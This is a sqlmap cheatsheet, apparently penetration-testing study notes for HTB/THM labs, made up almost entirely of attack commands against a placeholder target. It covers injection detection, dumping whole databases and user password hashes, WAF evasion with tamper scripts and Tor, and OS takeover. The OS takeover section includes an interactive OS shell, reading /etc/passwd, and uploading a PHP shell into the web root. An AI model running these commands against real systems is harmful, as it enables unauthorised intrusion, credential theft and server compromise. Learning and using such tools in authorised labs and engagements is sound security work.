---
title: "SQLMap Cheatsheet"
type: cheatsheet
tags: [cheatsheet, exploitation, htb, scanner, thm, web]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-sqlmap, thm-sqlmap]
---

## Detection — Basic

```bash
sqlmap -u "http://target.com/page.php?id=1" --batch          # GET, auto mode
sqlmap -u "http://target.com/" --data "uid=1&name=test"      # POST body
sqlmap -u "http://target.com/" --data "uid=1*&name=test"     # mark injection point
sqlmap -r req.txt                                             # from Burp request file
sqlmap -r req.txt -p id                                       # target specific param
```

## Detection — Request Customisation

```bash
--cookie="PHPSESSID=abc123"          # session cookie
-H "Cookie:PHPSESSID=abc123"         # as header
--random-agent                        # random browser UA (avoid sqlmap UA blocks)
--mobile                              # smartphone UA
--method PUT                          # alternative HTTP method
--proxy="http://127.0.0.1:8080"      # route through Burp
--tor                                 # route through Tor
--check-tor                           # verify Tor connectivity
```

## Enumeration — DB Info

```bash
--banner              # DBMS version string
--current-user        # active DB user
--current-db          # active database name
--is-dba              # check for DBA privileges
--dbs                 # list all databases
--passwords           # dump DB user hashes (+ auto-crack)
--banner --current-user --current-db --is-dba   # combined
```

## Enumeration — Tables / Columns / Data

```bash
--tables -D mydb                        # list tables in database
--columns -T users -D mydb              # list columns in table
--schema                                # full schema (all DBs)
--dump -T users -D mydb                 # dump table
--dump -T users -D mydb -C user,pass    # specific columns
--dump -T users -D mydb --start=2 --stop=5   # row range
--dump -T users -D mydb --where="id>5"  # conditional dump
--dump -D mydb                          # dump whole database
--dump-all --exclude-sysdbs             # dump all non-system DBs
--search -T user                        # find tables LIKE 'user'
--search -C pass                        # find columns LIKE 'pass'
--all --batch                           # dump everything (slow)
```

## WAF Bypass

```bash
--level=5                             # more boundaries (1–5, default 1)
--risk=3                              # more payloads; risk of side effects (1–3)
--technique=BEU                       # B=bool E=error U=union (skip T=time, S=stacked)
--random-agent                        # random UA
--skip-waf                            # skip WAF fingerprinting
--tamper=between                      # replace > and = operators
--tamper=randomcase                   # randomise keyword case
--tamper=space2comment                # replace spaces with /**/
--tamper=between,randomcase           # chain tampers
--chunked                             # chunked POST to split keywords
--list-tampers                        # show all tampers
```

## Tamper Quick Reference

| Tamper | Effect |
|---|---|
| `between` | `>` → `NOT BETWEEN 0 AND #` |
| `randomcase` | `SELECT` → `SEleCt` |
| `space2comment` | space → `/**/` |
| `space2dash` | space → `-- <rand>\n` |
| `base64encode` | Base64-encode payload |
| `versionedmorekeywords` | Wrap keywords in MySQL versioned comments |
| `percentage` | `SELECT` → `%S%E%L%E%C%T` |
| `modsecurityversioned` | Wrap full query in versioned comment |

## Advanced Tuning

```bash
--prefix="%'))" --suffix="-- -"         # custom payload wrapping
--union-cols=17                          # hint UNION column count
--string=success                         # TRUE/FALSE by string presence
--code=200                               # TRUE/FALSE by HTTP status code
--text-only                              # compare only visible page text
--randomize=rp                           # randomise parameter per request
--eval="import hashlib; h=hashlib.md5(id).hexdigest()"  # computed param value
--csrf-token="csrf-token"                # auto-update CSRF token field
```

## OS Interaction

```bash
--os-shell                              # interactive OS shell (needs FILE priv + writable web root)
--file-read="/etc/passwd"               # read remote file
--file-write="/tmp/sh.php" --file-dest="/var/www/html/sh.php"   # upload file
```

## Debugging and Verbosity

```bash
--parse-errors                          # display DBMS errors inline
-t /tmp/traffic.txt                     # save full HTTP traffic log
-v 3                                    # show payloads being tested
-v 6                                    # full debug, print every request
```

See [[sqlmap]] for the full tool page.
